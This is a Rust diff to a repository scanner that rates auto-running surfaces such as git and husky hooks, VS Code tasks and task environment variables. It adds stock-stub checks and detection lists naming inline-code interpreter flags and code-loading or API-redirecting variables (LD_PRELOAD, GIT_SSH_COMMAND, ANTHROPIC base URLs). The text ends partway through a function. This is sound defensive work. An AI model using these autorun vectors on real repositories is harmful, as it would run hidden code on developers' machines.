@@ -55,10 +55,12 @@ pub(crate) fn surfaces(f: &FileCtx, out: &mut Vec<Finding>) -> Vec<Surface> {
         found: Vec::new(),
         notes: Vec::new(),
     };
-    let name = base(path);
-    let in_dir = base(parent(path));
+    // Every name is matched in lower case: macOS and Windows find a file by a name in any case.
+    let lower = path.to_ascii_lowercase();
+    let name = base(&lower);
+    let in_dir = base(parent(&lower));
     if name == "package.json" {
-        if !path.split('/').any(|c| c == "node_modules") {
+        if !lower.split('/').any(|c| c == "node_modules") {
             package_json(&mut cx);
         }
     } else if name == "tasks.json" && matches!(in_dir, ".vscode" | ".cursor") {
@@ -71,7 +73,7 @@ pub(crate) fn surfaces(f: &FileCtx, out: &mut Vec<Finding>) -> Vec<Surface> {
         || (name == "devcontainer.json" && dir_above(path, ".devcontainer").is_some())
     {
         devcontainer(&mut cx);
-    } else if matches!(name, "Makefile" | "makefile" | "GNUmakefile" | "configure")
+    } else if matches!(name, "makefile" | "gnumakefile" | "configure")
         || name.ends_with(".mk")
         || name.ends_with(".m4")
     {
@@ -81,18 +83,20 @@ pub(crate) fn surfaces(f: &FileCtx, out: &mut Vec<Finding>) -> Vec<Surface> {
     } else if name == ".pre-commit-config.yaml" {
         pre_commit(&mut cx);
     } else if let Some(root) = dir_above(path, ".husky") {
-        if !path[root.len()..]
+        if lower[root.len()..]
             .trim_start_matches('/')
             .starts_with(".husky/_/")
         {
+            // What husky writes there is not the repo's own hook; a changed file is.
+            if !husky_stock(name, text) {
+                shell_surfaces(&mut cx, "autorun.husky-hook", false);
+            }
+        } else {
             shell_surfaces(&mut cx, "autorun.husky-hook", false);
         }
-    } else if matches!(name, "Justfile" | "justfile" | ".justfile") {
+    } else if matches!(name, "justfile" | ".justfile") {
         shell_surfaces(&mut cx, "autorun.justfile", true);
-    } else if matches!(
-        name,
-        "Taskfile.yml" | "Taskfile.yaml" | "taskfile.yml" | "taskfile.yaml"
-    ) {
+    } else if matches!(name, "taskfile.yml" | "taskfile.yaml") {
         taskfile(&mut cx);
     } else if name.ends_with(".csproj") || name.ends_with(".props") || name.ends_with(".targets") {
         msbuild(&mut cx);
@@ -521,7 +525,7 @@ pub(crate) fn entry_findings(paths: &[&str], out: &mut Vec<Finding>) {
         let Some(hook) = git_hook_name(path) else {
             continue;
         };
-        if hook.is_empty() || hook.ends_with(".sample") {
+        if hook.is_empty() || ends_with_ci(hook, ".sample") {
             continue;
         }
         out.push(finding(
@@ -535,18 +539,62 @@ pub(crate) fn entry_findings(paths: &[&str], out: &mut Vec<Finding>) {
             "Do not run git in this folder. Read the hook first.",
         ));
     }
+    lower_program_settings(paths, out);
+}
+
+/// Lowers an `autorun.vscode-program` finding from HIGH to LOW when the path it names, from the
+/// workspace folder, is not an entry of the tree (a file, or a folder with something in it): the
+/// editor then has nothing of the repo's to run, unless an install or build step creates it.
+fn lower_program_settings(paths: &[&str], findings: &mut [Finding]) {
+    let mut tree: Option<HashSet<String>> = None;
+    for f in findings.iter_mut() {
+        if f.rule != "autorun.vscode-program" || f.severity != Severity::High {
+            continue;
+        }
+        let Some((_, value)) = f.seen.split_once(" = ") else {
+            continue;
+        };
+        let target = workspace_target(value, workspace_base(&f.path)).unwrap_or_default();
+        let tree = tree.get_or_insert_with(|| {
+            let mut names = HashSet::new();
+            for p in paths {
+                let lower = p.to_ascii_lowercase();
+                for (i, _) in lower.rmatch_indices('/') {
+                    names.insert(lower[..i].to_string());
+                }
+                names.insert(lower);
+            }
+            names
+        });
+        if !tree.contains(&target.to_ascii_lowercase()) {
+            f.severity = Severity::Low;
+            f.why = "An editor setting names a path inside the repo, but nothing in the tree is \
+                     at that path, so the editor has no program of the repo's to run unless an \
+                     install or build step creates it."
+                .to_string();
+        }
+    }
 }
 
 /// The name of the hook at `path` when it is an entry of a `.git/hooks` folder.
 fn git_hook_name(path: &str) -> Option<&str> {
-    const MARK: &str = "/.git/hooks/";
-    path.strip_prefix(".git/hooks/")
-        .or_else(|| path.find(MARK).map(|i| &path[i + MARK.len()..]))
+    const HEAD: &str = ".git/hooks/";
+    // A folder name in any ASCII case is the same folder; the offsets of the lower-cased copy fit.
+    if path.len() <= HEAD.len() {
+        return None;
+    }
+    let lower = path.to_ascii_lowercase();
+    let at = if lower.starts_with(HEAD) {
+        HEAD.len()
+    } else {
+        lower.find("/.git/hooks/")? + 1 + HEAD.len()
+    };
+    Some(&path[at..])
 }
 
 /// True when `path` is a hook file `entry_findings` rates.
 pub(crate) fn is_git_hook(path: &str) -> bool {
-    git_hook_name(path).is_some_and(|h| !h.is_empty() && !h.ends_with(".sample"))
+    git_hook_name(path).is_some_and(|h| !h.is_empty() && !ends_with_ci(h, ".sample"))
 }
 
 /// Lowers `autorun.git-hooks` to LOW for the file `f` when it is the stock stub that pre-commit,
@@ -573,20 +621,48 @@ pub(crate) fn lower_hook_stubs(f: &FileCtx, findings: &mut [Finding]) {
     if let Some(tool) = known_stub(hook, text) {
         finding.severity = Severity::Low;
         finding.why = format!(
-            "The hook is the stock stub {tool} writes, and it only starts {tool}. An edited \
-             stub would be HIGH."
+            "The hook is the stock stub {tool} writes, line for line. An edited stub would be \
+             HIGH."
         );
     }
 }
 
 static PRE_COMMIT_ID: LazyLock<Regex> =
     LazyLock::new(|| Regex::new(r"^# ID: [0-9a-f]{32}$").expect("pattern compiles"));
+/// The Python line of a pre-commit stub: an absolute path, quoted when it needs it.
 static PRE_COMMIT_PYTHON: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"^INSTALL_PYTHON=([\w./+-]+|'[^'$`\\]*')$").expect("pattern compiles")
+    Regex::new(r"^INSTALL_PYTHON=(/[\w@%+=:,./-]*|'/[^'$`\\]*')$").expect("pattern compiles")
 });
+/// The arguments line: the default config only, a hook type, and the skip flag.
 static PRE_COMMIT_ARGS: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"^ARGS=\(hook-impl( --[\w-]+(=[\w./-]+)?)+\)$").expect("pattern compiles")
+    Regex::new(
+        r"^ARGS=\(hook-impl --config=\.pre-commit-config\.yaml --hook-type=[a-z][a-z-]*( --skip-on-missing-config)?\)$",
+    )
+    .expect("pattern compiles")
 });
+
+/// True for a `INSTALL_PYTHON=` line of a pre-commit stub that names an interpreter the machine
+/// installed: an absolute path with no `.` or `..` part, whose last part is `python` or `pypy`
+/// with a version, outside the folders anyone can write to or that name a process's own files.
+fn pre_commit_python_ok(line: &str) -> bool {
+    if !PRE_COMMIT_PYTHON.is_match(line) {
+        return false;
+    }
+    let value = line
+        .trim_start_matches("INSTALL_PYTHON=")
+        .trim_matches('\'');
+    let mut parts = value.split('/').skip(1);
+    let last = value.rsplit('/').next().unwrap_or("");
+    let version = last
+        .strip_prefix("python")
+        .or_else(|| last.strip_prefix("pypy"))
+        .is_some_and(|v| v.chars().all(|c| c.is_ascii_digit() || c == '.'));
+    version
+        && !parts.any(|p| matches!(p, "." | ".."))
+        && !["/proc/", "/dev/", "/tmp/", "/var/tmp/", "/run/", "/sys/"]
+            .iter()
+            .any(|dir| value.starts_with(dir))
+}
 /// The guard line git-lfs writes: older versions with `echo`, newer ones with `printf` and a
 /// longer message.
 static LFS_GUARD: LazyLock<Regex> = LazyLock::new(|| {
@@ -617,21 +693,400 @@ const PRE_COMMIT_LINES: &[&str] = &[
     "fi",
 ];
 
+/// The script husky 4.3.8 writes to `.git/hooks/husky.sh` after its three banner lines and a blank
+/// line. Husky 4.2.5 and 4.3.0 to 4.3.5 differ in the two lines of `HUSKY4_ALTERNATES`; the
+/// version line carries the installed version.
+const HUSKY4_MAIN: &str = r##"debug () {
+  if [ "$HUSKY_DEBUG" = "true" ] || [ "$HUSKY_DEBUG" = "1" ]; then
+    echo "husky:debug $1"
+  fi
+}
+
+command_exists () {
+  command -v "$1" >/dev/null 2>&1
+}
+
+run_command () {
+  if command_exists "$1"; then
+    "$@" husky-run $hookName $gitParams
+
+    exitCode="$?"
+    debug "$* husky-run exited with $exitCode exit code"
+
+    if [ $exitCode -eq 127 ]; then
+      echo "Can't find Husky, skipping $hookName hook"
+      echo "You can reinstall it using 'npm install husky --save-dev' or delete this hook"
+    else
+      exit $exitCode
+    fi
+
+  else
+    echo "Can't find $1 in PATH: $PATH"
+    echo "Skipping $hookName hook"
+    exit 0
+  fi
+}
+
+hookIsDefined () {
+  grep -qs $hookName \
+    package.json \
+    .huskyrc \
+    .huskyrc.json \
+    .huskyrc.yaml \
+    .huskyrc.yml
+}
+
+huskyVersion="0.0.0"
+gitParams="$*"
+hookName="$(basename "$0")"
+
+debug "husky v$huskyVersion - $hookName"
+
+# Skip if HUSKY_SKIP_HOOKS is set
+if [ "$HUSKY_SKIP_HOOKS" = "true" ] || [ "$HUSKY_SKIP_HOOKS" = "1" ]; then
+  debug "HUSKY_SKIP_HOOKS is set to $HUSKY_SKIP_HOOKS, skipping hook"
+  exit 0
+fi
+
+# Source user var and change directory
+. "$(dirname "$0")/husky.local.sh"
+debug "Current working directory is $(pwd)"
+
+# Skip fast if hookName is not defined
+# Don't skip if .huskyrc.js or .huskyrc.config.js are used as the heuristic could
+# fail due to the dynamic aspect of JS. For example:
+# `"pre-" + "commit"` or `require('./config/hooks')`)
+if [ ! -f .huskyrc.js ] && [ ! -f huskyrc.cjs ] && [ ! -f husky.config.js ] && [ ! -f husky.config.cjs ] && ! hookIsDefined; then
+  debug "$hookName config not found, skipping hook"
+  exit 0
+fi
+
+# Source user ~/.huskyrc
+if [ -f ~/.huskyrc ]; then
+  debug "source ~/.huskyrc"
+  . ~/.huskyrc
+fi
+
+# Set HUSKY_GIT_STDIN from stdin
+case $hookName in
+  "pre-push"|"post-rewrite")
+    export HUSKY_GIT_STDIN="$(cat)";;
+esac
+
+# Windows 10, Git Bash and Yarn 1 installer
+if command_exists winpty && test -t 1; then
+  exec < /dev/tty
+fi
+
+# Run husky-run with the package manager used to install Husky
+case $packageManager in
+  "npm") run_command npx --no-install;;
+  "npminstall") run_command npx --no-install;;
+  "pnpm") run_command pnpx --no-install;;
+  "yarn") run_command yarn run --silent;;
+  *) echo "Unknown package manager: $packageManager"; exit 0;;
+esac"##;
+
+/// Lines of `HUSKY4_MAIN` that older husky 4 versions wrote differently: the stock line, then the
+/// older one.
+const HUSKY4_ALTERNATES: &[(&str, &str)] = &[
+    (
+        "    \"$@\" husky-run $hookName $gitParams",
+        "    \"$@\" husky-run $hookName \"$gitParams\"",
+    ),
+    (
+        "if [ ! -f .huskyrc.js ] && [ ! -f huskyrc.cjs ] && [ ! -f husky.config.js ] && [ ! -f husky.config.cjs ] && ! hookIsDefined; then",
+        "if [ ! -f .huskyrc.js ] && [ ! -f husky.config.js ] && ! hookIsDefined; then",
+    ),
+];
+
+/// The lines simple-git-hooks writes before the command of a hook, the last one blank.
+const SIMPLE_GIT_HOOKS_PRELUDE: &[&str] = &[
+    "#!/bin/sh",
+    "",
+    "if [ \"$SKIP_SIMPLE_GIT_HOOKS\" = \"1\" ]; then",
+    "    echo \"[INFO] SKIP_SIMPLE_GIT_HOOKS is set to 1, skipping hook.\"",
+    "    exit 0",
+    "fi",
+    "",
+    "if [ -f \"$SIMPLE_GIT_HOOKS_RC\" ]; then",
+    "    . \"$SIMPLE_GIT_HOOKS_RC\"",
+    "fi",
+    "",
+];
+
+/// What a hook command of simple-git-hooks may call: a package runner, flags that name no file,
+/// and a tool that lints or checks what is staged. Anything else (a script, another package, a
+/// config file argument) is the repo's own code, so the hook stays HIGH.
+const HOOK_RUNNERS: &[&str] = &["npx", "pnpx", "bunx", "pnpm", "yarn", "npm", "bun"];
+const HOOK_RUNNER_WORDS: &[&str] = &["--no-install", "--yes", "-y", "exec", "run", "x"];
+const HOOK_TOOLS: &[&str] = &[
+    "lint-staged",
+    "commitlint",
+    "eslint",
+    "prettier",
+    "tsc",
+    "pretty-quick",
+    "stylelint",
+    "jest",
+    "vitest",
+    "biome",
+    "oxlint",
+    "nano-staged",
+];
+const HOOK_ARGS: &[&str] = &[
+    "--fix",
+    "--staged",
+    "--quiet",
+    "-q",
+    "--verbose",
+    "--edit",
+    "$1",
+    "\"$1\"",
+    "$@",
+    "\"$@\"",
+];
+
+/// True when `lines` are the prelude of simple-git-hooks and one command that calls a known tool.
+fn simple_git_hooks_stub(lines: &[&str]) -> bool {
+    let n = SIMPLE_GIT_HOOKS_PRELUDE.len();
+    if lines.len() <= n || lines[..n] != *SIMPLE_GIT_HOOKS_PRELUDE {
+        return false;
+    }
+    let mut command = lines[n..].iter().copied();
+    let (Some(command), None) = (command.next(), command.find(|l| !l.is_empty())) else {
+        return false;
+    };
+    let mut words = command.split_whitespace();
+    let Some(first) = words.next() else {
+        return false;
+    };
+    let tool = if HOOK_RUNNERS.contains(&first) {
+        loop {
+            match words.next() {
+                Some(w) if HOOK_RUNNER_WORDS.contains(&w) => {}
+                Some(w) => break w,
+                None => return false,
+            }
+        }
+    } else {
+        first
+    };
+    HOOK_TOOLS.contains(&tool) && words.all(|w| HOOK_ARGS.contains(&w))
+}
+
+/// True when a shell line starts an interpreter with code on its command line (`node -e`,
+/// `python -c`, `sh -c`, `perl -e`) or a module or file to load (`-m`, `-r`): code that no file
+/// of the tree shows.
+fn inline_code(line: &str) -> bool {
+    const INTERPRETERS: &[&str] = &[
+        "node",
+        "nodejs",
+        "deno",
+        "bun",
+        "perl",
+        "ruby",
+        "php",
+        "lua",
+        "sh",
+        "bash",
+        "zsh",
+        "dash",
+        "ksh",
+        "pwsh",
+        "powershell",
+        "osascript",
+        "awk",
+        "gawk",
+        "tclsh",
+        "rscript",
+    ];
+    const FLAGS: &[&str] = &[
+        "-e",
+        "-E",
+        "-c",
+        "-r",
+        "-p",
+        "-m",
+        "-M",
+        "-x",
+        "--eval",
+        "--print",
+        "--require",
+        "--import",
+        "--command",
+        "-command",
+        "-Command",
+        "-enc",
+        "-EncodedCommand",
+    ];
+    let mut words = line.split_whitespace().peekable();
+    while let Some(w) = words.next() {
+        let name = w
+            .trim_matches(['"', '\''])
+            .rsplit('/')
+            .next()
+            .unwrap_or("")
+            .to_ascii_lowercase();
+        let interpreter = INTERPRETERS.contains(&name.as_str())
+            || name.starts_with("python")
+            || name.starts_with("pypy");
+        if interpreter && words.clone().any(|f| FLAGS.contains(&f)) {
+            return true;
+        }
+    }
+    false
+}
+
+/// A line of the husky 4 banner: the version line, and two comment lines.
+fn husky4_banner(lines: &[&str]) -> bool {
+    static VERSION: LazyLock<Regex> = LazyLock::new(|| {
+        Regex::new(
+            r"^# Created by Husky v\d+\.\d+\.\d+ \(https://github\.com/typicode/husky#readme\)$",
+        )
+        .expect("pattern compiles")
+    });
+    lines.len() == 3
+        && VERSION.is_match(lines[0])
+        && lines[1].starts_with("#   At: ")
+        && lines[2].starts_with("#   From: ")
+}
+
+/// The stub husky 4 writes for a hook, `husky.sh` or `husky.local.sh` in `.git/hooks`: `name` is
+/// the file's name, `lines` its lines without the trailing blank ones.
+fn husky4_stub(name: &str, lines: &[&str]) -> bool {
+    match name {
+        "husky.sh" => {
+            let stock: Vec<&str> = HUSKY4_MAIN.lines().collect();
+            lines.len() == stock.len() + 4
+                && husky4_banner(&lines[..3])
+                && lines[3].is_empty()
+                && lines[4..].iter().zip(&stock).all(|(got, want)| {
+                    got == want
+                        || HUSKY4_ALTERNATES
+                            .iter()
+                            .any(|(stock_line, older)| stock_line == want && older == got)
+                        || (want.starts_with("huskyVersion=")
+                            && got
+                                .strip_prefix("huskyVersion=\"")
+                                .and_then(|v| v.strip_suffix('"'))
+                                .is_some_and(|v| {
+                                    !v.is_empty()
+                                        && v.chars().all(|c| c.is_ascii_digit() || c == '.')
+                                }))
+                })
+        }
+        "husky.local.sh" => {
+            static CD: LazyLock<Regex> =
+                LazyLock::new(|| Regex::new(r#"^cd "[\w./@ -]*"$"#).expect("pattern compiles"));
+            lines.len() == 6
+                && husky4_banner(&lines[..3])
+                && lines[3].is_empty()
+                && matches!(
+                    lines[4],
+                    "packageManager=npm"
+                        | "packageManager=npminstall"
+                        | "packageManager=pnpm"
+                        | "packageManager=yarn"
+                )
+                && CD.is_match(lines[5])
+                && !lines[5].contains("..")
+        }
+        _ => {
+            lines.len() == 8
+                && lines[0] == "#!/bin/sh"
+                && lines[1] == "# husky"
+                && lines[2].is_empty()
+                && husky4_banner(&lines[3..6])
+                && lines[6].is_empty()
+                && lines[7] == ". \"$(dirname \"$0\")/husky.sh\""
+        }
+    }
+}
+
+/// The three files husky 9 writes under `.husky/_/` besides one stub per hook.
+const HUSKY9_GITIGNORE: &str = "*";
+const HUSKY9_HOOK: &[&str] = &["#!/usr/bin/env sh", ". \"$(dirname \"$0\")/h\""];
+const HUSKY9_H: &str = r##"#!/usr/bin/env sh
+[ "$HUSKY" = "2" ] && set -x
+n=$(basename "$0")
+s=$(dirname "$(dirname "$0")")/$n
+
+[ ! -f "$s" ] && exit 0
+
+if [ -f "$HOME/.huskyrc" ]; then
+	echo "husky - '~/.huskyrc' is DEPRECATED, please move your code to ~/.config/husky/init.sh"
+fi
+i="${XDG_CONFIG_HOME:-$HOME/.config}/husky/init.sh"
+[ -f "$i" ] && . "$i"
+
+[ "${HUSKY-}" = "0" ] && exit 0
+
+export PATH="node_modules/.bin:$PATH"
+sh -e "$s" "$@"
+c=$?
+
+[ $c != 0 ] && echo "husky - $n script failed (code $c)"
+[ $c = 127 ] && echo "husky - command not found in PATH=$PATH"
+exit $c"##;
+const HUSKY9_SH: &str = r##"echo "husky - DEPRECATED
+
+Please remove the following two lines from $0:
+
+#!/usr/bin/env sh
+. \"\$(dirname -- \"\$0\")/_/husky.sh\"
+
+They WILL FAIL in v10.0.0
+""##;
+
+/// True when `text` is a file husky 9 writes under `.husky/_/`, whose name (in lower case) is
+/// `name`: `.gitignore`, `h`, `husky.sh` or the stub of a hook. Anything else there, or an edited
+/// copy, is a hook of the repo.
+fn husky_stock(name: &str, text: &str) -> bool {
+    let mut lines: Vec<&str> = text.lines().map(str::trim_end).collect();
+    while lines.last() == Some(&"") {
+        lines.pop();
+    }
+    let same = |want: &str| lines.iter().copied().eq(want.lines());
+    match name {
+        ".gitignore" => same(HUSKY9_GITIGNORE),
+        "h" => same(HUSKY9_H),
+        "husky.sh" => same(HUSKY9_SH),
+        n => {
+            n.starts_with(|c: char| c.is_ascii_lowercase())
+                && n.chars().all(|c| c.is_ascii_lowercase() || c == '-')
+                && lines == HUSKY9_HOOK
+        }
+    }
+}
+
 /// The tool whose generated stub `text` is, line for line; `None` for anything else.
 fn known_stub(hook: &str, text: &str) -> Option<&'static str> {
     if text.len() > 8192 {
         return None;
     }
+    let hook = hook.to_ascii_lowercase();
+    let hook = hook.as_str();
     let lines: Vec<&str> = text.lines().map(str::trim_end).collect();
+    let mut trimmed = lines.as_slice();
+    while let [rest @ .., ""] = trimmed {
+        trimmed = rest;
+    }
+    if husky4_stub(hook, trimmed) {
+        return Some("husky");
+    }
+    if simple_git_hooks_stub(&lines) {
+        return Some("simple-git-hooks");
+    }
     if lines.get(2).is_some_and(|l| PRE_COMMIT_ID.is_match(l))
         && PRE_COMMIT_LINES.iter().all(|want| lines.contains(want))
-        && lines.iter().any(|l| PRE_COMMIT_PYTHON.is_match(l))
+        && lines.iter().any(|l| pre_commit_python_ok(l))
         && lines.iter().any(|l| PRE_COMMIT_ARGS.is_match(l))
         && lines.iter().all(|l| {
             l.is_empty()
                 || PRE_COMMIT_LINES.contains(l)
                 || PRE_COMMIT_ID.is_match(l)
-                || PRE_COMMIT_PYTHON.is_match(l)
+                || pre_commit_python_ok(l)
                 || PRE_COMMIT_ARGS.is_match(l)
         })
     {
@@ -657,6 +1112,7 @@ fn known_stub(hook: &str, text: &str) -> Option<&'static str> {
         && lines.iter().all(|l| {
             matches!(shape::classify(l), Shape::Allowlisted | Shape::Plain)
                 && shape::files_run(&strip_shell_keyword(l)).is_empty()
+                && !inline_code(l)
                 && !["eval ", "rm ", "chmod ", "base64"]
                     .iter()
                     .any(|bad| l.contains(bad))
@@ -684,7 +1140,7 @@ fn by_presence(path: &str, out: &mut Vec<Finding>) -> bool {
         // `entry_findings` rates it, from the path alone.
         return true;
     }
-    let (severity, rule, why, seen) = if base(path) == "build.rs" {
+    let (severity, rule, why, seen) = if base(path).eq_ignore_ascii_case("build.rs") {
         (
             Severity::Info,
             "autorun.build-rs",
@@ -724,19 +1180,30 @@ fn parent(path: &str) -> &str {
     path.rsplit_once('/').map_or("", |(dir, _)| dir)
 }
 
-/// True when `path` is `tail` or ends with `/tail`.
-fn path_is(path: &str, tail: &str) -> bool {
-    path == tail
-        || path
-            .strip_suffix(tail)
-            .is_some_and(|head| head.ends_with('/'))
+/// True when `s` ends with `tail`, without regard to ASCII case. macOS and Windows find a file by
+/// a name in any case, so every name the rules look for is matched that way.
+fn ends_with_ci(s: &str, tail: &str) -> bool {
+    s.len() >= tail.len()
+        && s.is_char_boundary(s.len() - tail.len())
+        && s[s.len() - tail.len()..].eq_ignore_ascii_case(tail)
 }
 
-/// The part of `path` before the first folder named `folder`; `None` when there is none.
+/// True when `path` is `tail` or ends with `/tail`, without regard to ASCII case.
+fn path_is(path: &str, tail: &str) -> bool {
+    path.eq_ignore_ascii_case(tail)
+        || (path.len() > tail.len()
+            && ends_with_ci(path, tail)
+            && path.as_bytes()[path.len() - tail.len() - 1] == b'/')
+}
+
+/// The part of `path` before the first folder named `folder` (in any ASCII case); `None` when
+/// there is none.
 fn dir_above<'a>(path: &'a str, folder: &str) -> Option<&'a str> {
-    let marker = format!("{folder}/");
+    // Lower-casing ASCII keeps every byte offset, so the offsets found here fit `path`.
+    let lower = path.to_ascii_lowercase();
+    let marker = format!("{}/", folder.to_ascii_lowercase());
     let mut from = 0;
-    while let Some(i) = path[from..].find(&marker) {
+    while let Some(i) = lower[from..].find(&marker) {
         let at = from + i;
         if at == 0 {
             return Some("");
@@ -822,8 +1289,10 @@ struct Ini {
 }
 
 /// The entries of `text`. A file that uses CRLF for every line break loses the `\r` of each, so
-/// only a carriage return that is not a line ending shows in a value.
-fn ini_entries(text: &str) -> Vec<Ini> {
+/// only a carriage return that is not a line ending shows in a value. With `continuations` (git
+/// config syntax), a value that ends in a backslash goes on with the next line, as git reads it:
+/// the entry keeps the number of its first line.
+fn ini_entries(text: &str, continuations: bool) -> Vec<Ini> {
     let text = text.strip_prefix('\u{feff}').unwrap_or(text);
     let bytes = text.as_bytes();
     let all_crlf = text.contains('\n')
@@ -832,7 +1301,8 @@ fn ini_entries(text: &str) -> Vec<Ini> {
             .all(|(i, _)| i > 0 && bytes[i - 1] == b'\r');
     let mut section: Rc<str> = Rc::from("");
     let mut out = Vec::new();
-    for (i, raw) in text.split('\n').enumerate() {
+    let mut lines = text.split('\n').enumerate();
+    while let Some((i, raw)) = lines.next() {
         let raw = if all_crlf {
             raw.strip_suffix('\r').unwrap_or(raw)
         } else {
@@ -855,11 +1325,40 @@ fn ini_entries(text: &str) -> Vec<Ini> {
             }
         }
         if let Some((k, v)) = entry.split_once('=') {
+            let mut value = v.trim_matches([' ', '\t']).to_string();
+            loop {
+                if !continuations {
+                    break;
+                }
+                let cut = if value.ends_with("\\\r") {
+                    2
+                } else if value.ends_with('\\') {
+                    1
+                } else {
+                    break;
+                };
+                value.truncate(value.len() - cut);
+                let Some((_, next)) = lines.next() else {
+                    break;
+                };
+                let next = if all_crlf {
+                    next.strip_suffix('\r').unwrap_or(next)
+                } else {
+                    next
+                };
+                // Spaces before the first character of a value are dropped, wherever it starts.
+                if value.trim_matches([' ', '\t']).is_empty() {
+                    value.clear();
+                    value.push_str(next.trim_start_matches([' ', '\t']));
+                } else {
+                    value.push_str(next);
+                }
+            }
             out.push(Ini {
                 line: i + 1,
                 section: Rc::clone(&section),
                 key: k.trim().to_string(),
-                value: v.trim_matches([' ', '\t']).to_string(),
+                value: value.trim_matches([' ', '\t']).to_string(),
             });
         }
     }
@@ -1034,15 +1533,28 @@ fn vscode_tasks(cx: &mut Cx) {
         return;
     };
     let dir = parent(parent(cx.path)).to_string();
-    tasks_from(cx, tasks, &dir);
+    let file_options = v
+        .as_object()
+        .and_then(|o| o.get("options"))
+        .and_then(Value::as_object);
+    tasks_from(cx, tasks, file_options, &dir);
+}
+
+/// The `options` object of a task, of one of its platform blocks, or of a tasks file.
+fn options_of(task: &Map) -> Option<&Map> {
+    task.get("options").and_then(Value::as_object)
 }
 
 /// The surfaces of the tasks of a `tasks.json` or of the `tasks` block of a workspace file.
-fn tasks_from(cx: &mut Cx, tasks: &[Value], dir: &str) {
+/// `file_options` is the `options` object next to the `tasks` array; a task takes what it does
+/// not set itself from there.
+fn tasks_from<'a>(cx: &mut Cx, tasks: &'a [Value], file_options: Option<&'a Map>, dir: &str) {
     let text = cx.text;
     let mut walk = TaskWalk {
         by_label: HashMap::new(),
         visits: 0,
+        file_options,
+        envs: Vec::new(),
     };
     for task in tasks.iter().filter_map(Value::as_object) {
         if let Some(label) = task.get("label").and_then(Value::as_str) {
@@ -1050,6 +1562,7 @@ fn tasks_from(cx: &mut Cx, tasks: &[Value], dir: &str) {
         }
     }
     let mut hidden = false;
+    let mut runs_on_open = false;
     for task in tasks.iter().filter_map(Value::as_object) {
         if cx.found.len() >= MAX_TASK_COMMANDS || walk.visits >= MAX_TASK_VISITS {
             break;
@@ -1064,6 +1577,15 @@ fn tasks_from(cx: &mut Cx, tasks: &[Value], dir: &str) {
             continue;
         }
         hidden |= hides_output(task);
+        if !runs_on_open {
+            runs_on_open = true;
+            // What every task inherits counts once some task runs on open.
+            walk.envs.extend(
+                file_options
+                    .and_then(|o| o.get("env"))
+                    .and_then(Value::as_object),
+            );
+        }
         let mut commands = Vec::new();
         walk.collect(task, &mut HashSet::new(), 0, &mut commands);
         for (command, literal) in commands {
@@ -1098,6 +1620,143 @@ fn tasks_from(cx: &mut Cx, tasks: &[Value], dir: &str) {
                 .to_string(),
         );
     }
+    task_env_finding(cx, &walk.envs);
+}
+
+/// Environment variables that make the program a task starts run code: these are the keys of the
+/// agent settings rules (`env` of `.claude/settings.json`) that redirect a tool, plus the ones
+/// that load code or name a program. A task that runs on open starts the program at once.
+fn task_env_finding(cx: &mut Cx, envs: &[&Map]) {
+    let text = cx.text;
+    let mut worst: Option<(Severity, String, String)> = None;
+    for env in envs {
+        for (key, value) in env.iter().take(500) {
+            let Some(value) = value.as_str() else {
+                continue;
+            };
+            if let Some(level) = task_env_level(key, value)
+                && worst.as_ref().is_none_or(|(s, _, _)| level > *s)
+            {
+                worst = Some((level, key.to_string(), format!("{key}={value}")));
+            }
+        }
+    }
+    let Some((severity, key, seen)) = worst else {
+        return;
+    };
+    let why = match severity {
+        Severity::Medium => {
+            "A task that runs when the folder opens points a service at another address."
+        }
+        Severity::High => {
+            "A task that runs when the folder opens puts a folder of the repo on a search path \
+             of the program it starts, so that program can load or run code the repo ships."
+        }
+        _ => {
+            "A task that runs when the folder opens sets an environment variable that makes the \
+             program it starts load or run code, or redirects a tool."
+        }
+    };
+    cx.find(
+        severity,
+        "autorun.vscode-task-env",
+        key_line(text, 0, &key),
+        why,
+        &seen,
+        READ_FIRST,
+    );
+}
+
+/// Keys that run a program or load code whatever their value is.
+const TASK_ENV_CODE_KEYS: &[&str] = &[
+    "BASH_ENV",
+    "ZDOTDIR",
+    "LD_PRELOAD",
+    "LD_AUDIT",
+    "DYLD_INSERT_LIBRARIES",
+    "GIT_SSH_COMMAND",
+    "GIT_SSH",
+    "GIT_ASKPASS",
+    "SSH_ASKPASS",
+    "GIT_EXEC_PATH",
+    "GIT_CONFIG_COUNT",
+    "GIT_CONFIG_GLOBAL",
+    "GIT_CONFIG_SYSTEM",
+    "PYTHONSTARTUP",
+    "CLAUDE_CONFIG_DIR",
+    "CODEX_HOME",
+    "NODE_EXTRA_CA_CERTS",
+    "HTTP_PROXY",
+    "HTTPS_PROXY",
+    "ALL_PROXY",
+];
+/// Keys whose value is a list of options, which load code when one of them names a module.
+const TASK_ENV_OPTION_KEYS: &[&str] = &[
+    "NODE_OPTIONS",
+    "PERL5OPT",
+    "RUBYOPT",
+    "JAVA_TOOL_OPTIONS",
+    "_JAVA_OPTIONS",
+];
+/// Keys whose value is a list of folders searched for programs, libraries or modules.
+const TASK_ENV_PATH_KEYS: &[&str] = &[
+    "PATH",
+    "LD_LIBRARY_PATH",
+    "DYLD_LIBRARY_PATH",
+    "DYLD_FRAMEWORK_PATH",
+    "PYTHONPATH",
+    "PERL5LIB",
+    "RUBYLIB",
+    "NODE_PATH",
+];
+
+static TASK_ENV_LOADS_CODE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(
+        r"(?:^|\s)(?:-r|-M|-I|--require|--import|--loader|--experimental-loader|-javaagent|-agentpath|-agentlib)",
+    )
+    .expect("pattern compiles")
+});
+
+static TASK_ENV_REDIRECT: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"^(?:ANTHROPIC_(?:.*_)?(?:BASE_URL|API_KEY|AUTH_TOKEN)|CLAUDE_.*_BASE_URL)$")
+        .expect("pattern compiles")
+});
+
+/// How much an environment variable of a task that runs on open is worth, or `None`.
+fn task_env_level(key: &str, value: &str) -> Option<Severity> {
+    // Names are not case-sensitive on Windows.
+    let key = key.to_ascii_uppercase();
+    let key = key.as_str();
+    if TASK_ENV_CODE_KEYS.contains(&key)
+        || TASK_ENV_REDIRECT.is_match(key)
+        || key.starts_with("GIT_CONFIG_KEY_")
+        || key.starts_with("GIT_CONFIG_VALUE_")
+        // `ENV` is a file of shell code only when it is a path; `ENV=production` is a name.
+        || (key == "ENV" && value.contains(['/', '\\']))
+        || (TASK_ENV_OPTION_KEYS.contains(&key) && TASK_ENV_LOADS_CODE.is_match(value))
+    {
+        return Some(Severity::Critical);
+    }
